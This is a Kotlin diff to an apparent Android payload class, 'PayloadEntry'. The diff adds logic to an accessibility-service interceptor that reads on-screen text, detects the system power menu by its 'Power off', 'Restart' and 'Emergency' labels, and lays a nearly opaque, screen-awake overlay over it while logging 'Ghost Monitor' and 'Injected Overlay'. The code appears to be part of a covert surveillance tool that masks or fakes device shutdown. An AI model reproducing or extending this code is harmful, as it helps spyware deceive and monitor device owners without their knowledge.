@@ -23,38 +23,42 @@ class PayloadEntry : DynamicEntry {
 
     override @Composable fun Render(context: Context, resDir: File) {
         LaunchedEffect(Unit) {
-            DynamicEntry.log("🕵️ Pass-through Monitor Active")
+            DynamicEntry.log("🕵️ Ghost Monitor: Waiting for Power Menu...")
             
             DynamicEntry.accessibilityInterceptor = { event ->
-                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
+                    event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
+                    
                     val packageName = event.packageName?.toString() ?: ""
-                    
-                    // Hide if system UI (shade/launcher) takes focus
-                    isShadeVisible = packageName == "com.android.systemui"
-                    
                     val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
+                    
                     root?.let {
-                        try {
-                            val nodes = mutableListOf<String>()
-                            findTextNodes(it, nodes)
-                            
-                            // Detect power menu but don't block it
-                            if (nodes.any { n -> n.contains("Power off", ignoreCase = true) }) {
-                                if (!isOverlayShowing) {
-                                    DynamicEntry.log("🎯 Power Menu Detected (Pass-through mode)")
-                                    DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
-                                        flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
-                                                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or 
-                                                android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
-                                        alpha = 0.8f
-                                    )
-                                    isOverlayShowing = true
-                                }
-                            } else if (!isShadeVisible && packageName != "android") {
-                                // If we're not in the power menu (android) or shade, we can reset
-                                // but let's keep it simple for now
+                        val nodes = mutableListOf<String>()
+                        findTextNodes(it, nodes)
+                        
+                        val hasPowerText = nodes.any { n -> 
+                            n.contains("Power off", true) || n.contains("Restart", true) || n.contains("Emergency", true)
+                        }
+
+                        if (hasPowerText) {
+                            isShadeVisible = false
+                            if (!isOverlayShowing) {
+                                DynamicEntry.log("🎯 Power Menu Detected: Injected Overlay")
+                                DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
+                                    flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
+                                            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or 
+                                            android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                                    alpha = 0.9f
+                                )
+                                isOverlayShowing = true
                             }
-                        } catch (e: Exception) { }
+                        } else {
+                            // If no power text, check if it's the shade
+                            isShadeVisible = packageName == "com.android.systemui"
+                            if (packageName != "android" && !isShadeVisible) {
+                                isOverlayShowing = false 
+                            }
+                        }
                     }
                 }
             }
